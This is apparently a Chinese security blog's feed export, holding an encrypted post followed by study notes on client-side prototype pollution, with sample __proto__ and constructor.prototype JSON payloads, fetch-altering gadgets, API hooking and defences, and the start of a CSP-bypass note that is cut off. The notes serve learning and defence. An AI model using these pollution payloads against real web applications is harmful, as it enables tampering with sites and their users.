eabc281c8662524167aa083031d70c498bac7b8743fe88a0d4a0da01fe1941954774f30ecc799b6c7f63919172637975c418d26df19247069a6c33aadd73af1b9a30c768893637216852118aff5bfd78bfee47b47a418e535bc9b346f6cd6c238400c47a5953009e9c22f0329613de14798a921f253767fc1f4a75c1ad6d17c8f0bbdea1347d27949538daae239da6b961ba1361579108dc1203876bfd1db251d8322db49c0fbf6bf6f3c104b8a9702ad4df90980a0cd54126a3b6209e0661a19ad9bd0627f01ca2475cda6f0643dd1c153bf2adcdb5ee9af3aebf03098b9988990b26aae8f9ebca79bad2a764b075f2e917fe3117c111ae113f6f71a410dba4c39ba31d09a7c061ad7857f4bcf3220b5a644008254298de16ac14ea088e674890f65d643bdef69f08b3ccd0572c85eaf841de1281702ed1c5600101d89a92099973558c0bb83267d19931cd0974e8bb56aecfff76b51cd113cdc0450b47946fec65cc318a1e8346e935665630fbf0ced29d9c5eef499303d0d6f82c8aa5aa556983d7e3f547342ee3d23e3e7f594efef82da912e658dc41a44e19bc4f8a1ea1f3d650dc1e881a33ab131e7674532cd7bb40b054d4bbdae28ed48c63964fcd613beabb8558f80757fa08faed9a8bd7fecf104b53f36f62b27dc76817b22e7f73ad9890d7d0aebbf7b01e7f579ebf4b0e6e7e9c76bbd4af3779659e13a689e4d0ba3e4385c35b0dc837d8b9cb6c2e206698c9e455c127376a5d704a13ea6cd2913bd52cd389025e060234b55ec3f33ef4d3a242d15f0d370a7c1e375113a91137d11ab66bbe13c18f8a47dc55f1f044781879409ab1667b5b9a7be239bb004efc45cde6f178a20a92c60719a16b2d7abd7cc6bb1e03819f0288f2f6a3a296845c07143390e66f36f321919a7fd537b082900ef8d93f3477d501ddc0f6b4be9af64111c47c6bed09467d363be8effe0af26a66793cb9046b55c3e5b5c07ee5b05982d996b4af55a6309015e3b34c5166ae3bbea31e963d7a164bddb9e4f1bd55e5a5904bbdc1ea66518faebc57b5efc7bf6174f9e9c4a17a25a61dd85cd26f9748a97dfc6a81e1028040cfdb0411f536186dc1cc83decffc8085cd748fb1f632b627a5b1a0f9d1686545881c9741e298e4e5a15279da6a9b8d6194e84938f48b14bf95b220790d6adf5f6f1dd242efd9f94f549478a9c7540150e593eebb70f87b25543244d9dd107ea17eb17f23b7009e2973f6cb78d1673d384501ebcaf8baeb8b09a89e1cc13c8f4d682ff0dde2a6920493dc6b471f7331d1375afd33360d0e88c1366c26b757306f588169aca2c52136e9ef5958ca1bc72ec79416493545d892985e54e5b5529c98834a8f9b3995c07fd2a5df069705add41ac69bf1c278b84c7dbb02030e02c703678a4c2b8bb70e14aae96f0780996c706b4a3390edabca977e47964b21f13a2406abf3095c7559601062373af0ae751f276a416a8958d179871fd22a93fb1eef330ca8ce2bd20a79702ca30795406d022f067e473a628e85bddf743722b224857b356278d64b6a67e51db2e538add8cb28846c2388e2c1e0706dced7dbb87f5b96bb091070664543f43786b6861582db67f3f3e7d245956d27db56f2974a196e4e9b2251310034b76271df3d0f49cd1ca103f71d3b174ea2fc1a6b8cea16485775efa3719cf702f2a4966b9f477a29c7b621b8bfd35584e64bba1dae99d4d3c326ea8983efa2335e9718c59324e698b078db0be2239d1d7baef3d2d3f7369e31f1756af48385c649a90fe885cc779787f1ad356bc3d2b6e237d5fbce2fe6ebcc7d30a9daf240cd26470cfb7dbf86133d69d4eb6fa78b519d99a661aaf5e9bf9b329fbbab10aedf999528d059330734f9b27d10095cdc12904acb52f9d2c3b35396bd32d1f42699bbbc4b0f766e5b7eea05a179ac5adb963eb700a59c485620bcc7a801919444260c7439382ee04798ea57d1b22d6e0e8e501ada5241e451bd355ad9c95b4d68ece7700f60261eb65cbf79d44f52b25160382082c55785eb9c38dda89174d1627b2c683388814fc84fcf203bbf4ae9d73393c7810e3b0c25bfb1d79fdfe100331ce02e14a8bc677ebb1b2b682ca5672b7a37cbfddc2e6e26d9f5024e01451aa8bc6db852cfb8697c86220582826554d3af55ff475b1b08acce5dd1bce6730b34eaaa569cce16a60f88d55ec93943951481786d649d52ccfaa6d632ba29e29995fc93d2937687b4fb72b61d2f064daf14982af074d797570ccc8271c3b669f6cf7464a923fe08685b9f6178b2062e302379c13046cec83733bc0f9662db2abd5ead564e6ffa5655d05950cfd04fad76272d0fbd5a8dca85553333443b5b18cb2cfa7f5f6c83c76edd81a4670d8b92d750cf0d24d124f00bbc0fc1aa36bc32fa33b50348303aa69d29a161e38d38e9931c02e8c11a8f04271726ccb2cc3578a72e354f1508b78374c5a58cf1d32f4d51e1f5a5ff7ecabfbf953b1896d73497724354f881800a070b434edf0f13e032c930c7284e68a9cd9052be3b90c64c016bb73fca0ad5912bb19159a786e99323a21f3e0ac531910cb7faf61addb1e22ab00337f868c3f15fda2e9c7e0e72bea872ff33730556bbfe3fc0bd7ef3e256dbc220d5989dd33140f259dc7249cfef627ea072469df631ca7150044fbcb32ef995d6e02df897bcc3173e3e243c34f7bd34a8342504362b223c6c3aa122c43a287caabce957928d84a549bac54557d1cb33305e4f8bc4f3637bb5dba213c5f56bea00e7dd7a881007b26b3d36cc453032082494a83730b220532792c72f550190169a7593081546fae4367012877bcc15da4e242c1f6d46d94f81b8937d3f733b4ee288320e457b54c69d448527bc4e08d2c603a9198f8233e9a12995e93bd69e07a1132557c366be32363e3fa9313ccfe3e5ae8149d582ac3f4524eeeb0195a10b467518b4aebc6f2eb58064ec0dbe8b0844ed5f68aecb52a1060765cd255ccfb716e97eca24606b497c8fadce5818fba613932378ec8ea3b1aa575eb7af2719774601d233a758d9b5f8936e038de2bd0ee49c1e79370112c3bd6d6386cb5d58da312bc0e842b103bb85b5fd10a2b9fc6c5263db9a4ed907514da2abc1f91ee3e1f23c84d03c4c712020c9b93f75327ca243c07475e1e606501721c5045a5e9fadfb191adf2ee38fc563cffd7b6938b7c64eff6e89264a85866a0567b775cbec7a8a563f99d1840907aaa664db61e90457b48cd2eb3ec524920e5d1cc82416347e46f928905a7f37cea3075b8de8a978eb352014c0e9e80a37c67ad89e6771df60cf30898ae98d580df464cbe521789b7f87707bc69ac3ae5e82c04a706a2af3078526d4c0344160b0054f86bdbc9e098594584a386c2460c5e2a9bb389e509ede585ffb308101833c28b5e0b3074ff06ef04967f279c748eda516c5ab98e2e60c7ed4fa519ecfa9239f2fb50117e69a4c9aa27d537610b1bf4477f2112d1d5f8d676c4687fde66f46e2402eea5b7ce2e7ce8da46fa2295f11297146e7e918ada6590669f78ad553edf2b43e6a01f3eab5067993f665cf693aed0e3d81c20e8c035c59ccaf9fab0318bf50ab65aaac3c5bd03b8f48194351106563ccb032b7df247de4e0d604ac1bbff5db0a3da55f9bc63477e7d0b70d39e611e9d2b366c6b2c24c75bcb8d393dcce4718c1d42c5c894e2b0c02c4311ef5f0f92e676de6949a1d4d1261cc32c6f6f7e88bc986c86aa054c7a310c6d3717d59e39ab6c6c1cd18a839e39a7547e93a92503313ad0dd5f77e675aa190b6f7880b7f7c3c9009b2ead709af456468b1e80d84fb5c7c3dac3202b18ea7ae974e66038b59ecdfcae843c7dcdbe03267c67957118f72b82ffc3be16dd1993b413bcf680973217b41bfdfa42233a2d534d736ec7f747cef1c4497aa58387de383963773cbe7a4a977331e9b9b8e0ddc772e0a08084e0fb13376670dd47b9456cefdc48040c8e2cef208dcfd875aaa60485e864cc1b9b6cc6e8aa2cfea399e020cd3c9620ddf15fe9096623ac0f581910abb2c4b4b158ce2052fa6311574f1d1f8c8ec7726547cfcc29fc201cca05fe6e946d4e8ef425b9837bcd59266fa6d8dafab5141f823d56a18f2865c5ca08bdaad7466c16d6e870539e482efafc5ffb62706129bd39430d58d1388bfa7a6a66e684828eff8c247fd12f4d0003a5518e5d6342d299714d8995f61d5f84fab89b6fda4ac289ee230a18c2b9c1ff7110bd7a58a82cb389004c953a427ef24fd5bbf4648188d02af0c9f8758682214c2f001decc0f5e93ccbc085671bb47bb135bbf8daa3be101f609ab658ddba0d8e8db13db442b747a954007dc1f3c52b543cfdf5ce81275cb64f0e42de491d5d1123f0ce9b08a791c5e2ab1540c9a87c353de16a081c3fbd946d7728e3b9269d9e615a1ea2661df05eb04323de5c698f53f8714744b29e2126ec67f9aea9a5554acd39eba3d6ba40d71bb4dd0be1cfe0583cb2a5e4487019f11b1bd67b69e156532cb9b89f57671584cf9b5e3a6614bc3910dc8e07871f34867ca45cf4121049290327b820ff6f1578ac3de2c698f6fb329cda22ad59f3ff0d23bc47ca14bd322277bf1c564c00fe0608d521458176084ef9be50678dffbd3b94edc8097fe3e364ae073c78eeb3bf73a4e31cc6c56de8ac388bd2042d8423d0300c262bb091488c72ea9bd729c1a390eed5c6d724d7c82b5d08d2b31ed33a3686db3a5b81b2ad5593b473c21b16e783c1a19cc3e5f8f8f6b0ba6d95e623613111e4175f9e7b4f394f32999da868194d7ff12ae0aeeb447c4d58ee281b641368e2f870b2c2a1b19bba592db6218f315104d5eec8ee6b28a0d26b50a2e15a9eb3e4b04c5b9c78cfe726946ec4547a36e7769a26c69be61ea4e532b8375038da38ff57f9dc5ebe2b80fd5ab2f2218f4efb4953d6345a796fa86e675347f9cd0f8a9e2f2d372026db7a01443df21c6fb7aa68663509ed32664b470aef152818558edf7c98ea26a3c5f2642a7ff3f9b9d36f82f078b0d5c75f995f2903e408b4ba2a085c550e29b90e103c6f876bf7cc0be657a4f5c4096d0f39359aed2e310da35e143d83359ad6a4470b004d7de71a6e5cf738d4f8e775c8be9c4e1e264e8255a774a43f2794aabd183758509caba0fc5478fd71f7a8d76b0f4b1a41f6359e140411167090ade33e0b6bbbded69108bae8e3ba5ef1876d9708ac2ea224e6019a41e6f86a312d3e9bbd5f4bc67a43f12a5c32013e53eb33cba6ac8d1985b9fb21f3b6a3c684208b897d86e9c09026b4f0d5b5ca842d22b0a2abc883d18b48cbc2b6c55fdecd45917c1257dea1152392c8aa0f7d089cfe8acf1c56773a33f6fc503234c1ffdbd78268195258f209fd89f2f6fc9d18b950e84bb8497fc5b2de56588c41d0af3c3f8838d1fe8f0b5340fd3c950e8f321c8731da57e28302c36ad216f10dfa6d06438a7f657103a2fc4ae0fa5a14d5ea9857e312db4079b18c9e1ff526d2848320c69cab1c9150ac226197823c3ba4848f67a22bc887d3731523cfb4c5ebf2c4113e8da8c45ee65fc20e1f4d59cd49ab940a7590384ccb6f548661b2c5efe3a48bb1ffa1d6b19077e14b5744cd7ba9c5c1f8a3b11912b3c79b02b3c0393a6efb92a449ad3e09ac950f22ffb9028e1d29a98e41897d487ae2050f3e7488a0a40ade96b48a48f084d091c804616f89e7bb9dd7aa6b1f0ec16930d576a8db85b5857261c25d6ef165bdd6f4ff9d5a99808d758cb12d5da999acbe2ca0cd76704e42fe1a04cac1721d32a63992e04ec5ce5f7ef8410b99c3c5a2a5aeed72916fc585c83e7d69ca385b0fdb7098b7a1fc64d7d5743963075c026ce4dd24c9aba115477b86d8748bf35b10c5ba5a1f2871b1e0388e2143df5155d839570f8edcfa4fb5007ed03aff7760f5667791ca330ca5f20acf5b35a9e188d09c344f3b5be62a77bd3b3677e2f22ade57065c4e0dd98a9e3f1651e46c3639f9335716013c766d04790bc05845f56f40e3653b71d024baa7dcc1f61e02009ccf2416db444fc18baa37e2fcc1892f70c4b9c34830501fa3073ec5e1ef60d13ec653e3da8474fba704e5951c2df1c7c87f846ad1fcbbf5673b7d6115ebe2782a3c80de5c0c504a7f34edf98d1ff5931eb0c599d5030e09b7c6b92b61c7aeda022a29e8bb07a734df9429e891eaba83f171bfab457280432d1818c4de1d628a3dc83175922644014f41dad66dba12044e3141fac8a0282cd3ad4ab69c6a2f9a8add444f1c4a8096348d6e7464fac5a749353716bd7e6284c4ed1bf536fa14f5002a47d6a99ea66307ca8ba9b93edf8bfa94f1c496c5c75b14e218494dc2d97685bdc8ecd887ce9aeb8ec4865068bcba5f91d8c7874cdaba35beb1e25eefae606a82b27842f549cfefa651ad1fa4e4826d5829d6753f011a82252970e3c97683996552e046f64df68ae147a6c013894766e8753b4b9fd86757e210070c12442da77b1e65c7e740a81e1839461929cb5f6128845be408544aedf8ccd2c38d35b73c32424e087dca70b544e8bee54060df2a5a4e5914d177136cdc41aff691b6cd54997efba01804522c9f6cab97dc3263017d3027fbced54bd533a485f827ea70262f03ea4402d3f7d2fdd7bf26d94f91cff6e6e4599674368da2d8dc82996d7e67c5bb56ae454495e6eed7ace833775ff48388a57e4cb28001cacd4b1f1761f9f595c41faa5faae791a0f3d1ec750fbac4a57008587e71c7e396ecd1e57d4bfdac9a8aa4a5a5ef7bc304b67ab5b616a0a5f9b1b3a0452e2791961993ab2a47ce3f5585ef3581e08591ac3967acca5e30e0f71c8564453</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码阅读</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>前端安全7-原型链污染（笔记）</title>
    <link href="http://example.com/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A87-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A87-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-10-02T05:24:12.000Z</published>
    <updated>2023-10-13T00:32:32.567Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前一直以为原型链污染是后端污染一下那些渲染的中间件什么的，看了google ctf那题，发现前端也可以用这种思路</p><ul><li><a href="https://ithelp.ithome.com.tw/articles/10317892">https://ithelp.ithome.com.tw/articles/10317892</a></li></ul><blockquote><p>有几章我跳过了，因为感觉都是些历史漏洞，就不太想再发文章去记录，但是也是很有知道的必要<br><a href="https://ithelp.ithome.com.tw/articles/10317133">Universal XSS</a><br><a href="https://ithelp.ithome.com.tw/articles/10316778">Mutation XSS</a><br><span id="more"></span></p></blockquote><h1 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h1><p>总感觉自己讲不清楚，还是去看别人写的吧<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure><br>当用JSON.parse可以把<strong>proto</strong>当为纯键值。<br>调试分析了一下，发现在第二层的时候会判断<code>__proto__</code>是否在对象中，对于target来说是原型链存在，对于source来说是普通的键值，就是<code>&#123;&#39;b&#39;:2&#125;</code><br>当然也可以用<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;constructor&quot;: &#123;&quot;prototype&quot;:&#123;&quot;b&quot;: 2&#125;&#125;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><br>在控制台输入<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj = &#123;&#125;</span><br><span class="line">obj.<span class="property">__proto__</span> == obj.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> </span><br><span class="line"><span class="comment">//true</span></span><br></pre></td></tr></table></figure></p><h2 id="constructor-和-prototype"><a href="#constructor-和-prototype" class="headerlink" title="constructor 和 prototype"></a>constructor 和 prototype</h2><p>这时候会引出一个问题，就是经常会看到，一会是<code>constructor.prototype</code>，一会又是<code>prototype.constructor</code>，这时候就很容易搞混<br>可以参考这篇文章，我感觉我自己都有点迷糊<br><a href="https://wangdoc.com/javascript/oop/prototype">https://wangdoc.com/javascript/oop/prototype</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">color</span> = <span class="string">&#x27;white&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cat1 = <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&#x27;大毛&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cat2 = <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&#x27;二毛&#x27;</span>);</span><br></pre></td></tr></table></figure><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Animal</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>==cat1.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span><span class="comment">//false</span></span><br></pre></td></tr></table></figure></p><p>同样是<code>constructor.prototype</code>，Animal是Function，cat1是Object<br><code>cat1.constructor</code>指向他的构造函数，也就是<code>Animal</code><br><code>Animal.constructor</code>也是指向他的构造函数，但是是<code>Function</code>，所以下面的就会是true<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Animal</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> == <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">cat1.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> == <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="literal">true</span> </span><br></pre></td></tr></table></figure></p><p><code>__proto__</code>可以用来访问对象的原型，也就是<code>prototype</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat1.<span class="property">__proto__</span>.<span class="property">__proto__</span> == <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">cat1.<span class="property">__proto__</span> == <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="literal">true</span> </span><br></pre></td></tr></table></figure><br>原理这些还是自己去找资料吧，感觉我讲的也不清晰</p><h1 id="Prototype-pollution-script-gadgets"><a href="#Prototype-pollution-script-gadgets" class="headerlink" title="Prototype pollution script gadgets"></a>Prototype pollution script gadgets</h1><p><a href="https://github.com/BlackFan/client-side-prototype-pollution">https://github.com/BlackFan/client-side-prototype-pollution</a></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h2 id="过滤字符串过滤"><a href="#过滤字符串过滤" class="headerlink" title="过滤字符串过滤"></a>过滤字符串过滤</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key === <span class="string">&quot;constructor&quot;</span> || key == <span class="string">&#x27;__proto__&#x27;</span> || key == <span class="string">&quot;prototype&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;No pollution&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="创建一个空对象"><a href="#创建一个空对象" class="headerlink" title="创建一个空对象"></a>创建一个空对象</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)</span><br><span class="line">obj[<span class="string">&#x27;__proto__&#x27;</span>][<span class="string">&#x27;a&#x27;</span>] = <span class="number">1</span></span><br><span class="line"><span class="comment">// TypeError: Cannot set property &#x27;a&#x27; of undefined</span></span><br></pre></td></tr></table></figure><h2 id="冻结prototype"><a href="#冻结prototype" class="headerlink" title="冻结prototype"></a>冻结prototype</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;</span><br><span class="line">obj[<span class="string">&#x27;__proto__&#x27;</span>][<span class="string">&#x27;a&#x27;</span>] = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj2.<span class="property">a</span>)</span><br></pre></td></tr></table></figure><p>不会报错，只是不能被修改，可能会增加debug的难度</p><h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><p>通过<code>--disable-proto</code>关掉<code>prototype</code><br><a href="https://nodejs.org/api/cli.html#cli_disable_proto_mode">官方文档</a></p><h1 id="隐形的前端gadget"><a href="#隐形的前端gadget" class="headerlink" title="隐形的前端gadget"></a>隐形的前端gadget</h1><p>可以通过更改前端的API的一些变量<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = <span class="string">&#x27;a=1&#x27;</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">method</span> = <span class="string">&#x27;POST&#x27;</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://example.com&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;cors&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>例如上面这种，就会把本来应该发送GET请求的代码，变成发送POST<br><img src="/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A87-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt></p><p>有时候有些条件可以让你直接把<code>fetch</code>给覆盖了，这样他的代码都会走你的假<code>fetch</code>，这也是爬虫里面经常用到的技巧<br>例如下面的代码，参考 <a href="https://mp.weixin.qq.com/s/H4oQvqZmWS4af1VF1nAzkA">https://mp.weixin.qq.com/s/H4oQvqZmWS4af1VF1nAzkA</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> stringify = <span class="title class_">JSON</span>.<span class="property">stringify</span>;</span><br><span class="line">    <span class="title class_">JSON</span>.<span class="property">stringify</span> = <span class="keyword">function</span>(<span class="params">params</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook JSON.stringify ——&gt; &quot;</span>, params);</span><br><span class="line">        <span class="keyword">debugger</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">stringify</span>(params);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> open = <span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">open</span>;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">open</span> = <span class="keyword">function</span> (<span class="params">method, url, <span class="keyword">async</span></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (url.<span class="title function_">indexOf</span>(<span class="string">&quot;rnd&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">debugger</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> open.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>把原来的API备份一份，然后在把原来的API给覆盖了</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;以前一直以为原型链污染是后端污染一下那些渲染的中间件什么的，看了google ctf那题，发现前端也可以用这种思路&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10317892&quot;&gt;https://ithelp.ithome.com.tw/articles/10317892&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;有几章我跳过了，因为感觉都是些历史漏洞，就不太想再发文章去记录，但是也是很有知道的必要&lt;br&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10317133&quot;&gt;Universal XSS&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10316778&quot;&gt;Mutation XSS&lt;/a&gt;&lt;br&gt;&lt;/p&gt;&lt;/blockquote&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>前端安全6-CSP绕过（笔记）</title>
    <link href="http://example.com/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A86-CSP%E7%BB%95%E8%BF%87%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A86-CSP%E7%BB%95%E8%BF%87%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-10-01T17:20:04.000Z</published>
    <updated>2023-10-02T05:18:40.272Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>绕过csp的一些方法</p><ul><li><a href="https://ithelp.ithome.com.tw/articles/10316449">https://ithelp.ithome.com.tw/articles/10316449</a><span id="more"></span></li></ul><h1 id="不安全的domain"><a href="#不安全的domain" class="headerlink" title="不安全的domain"></a>不安全的domain</h1><p>有一些三方库存在0day<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/CanardMandarin/csp-bypass</span><br></pre></td></tr></table></figure><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 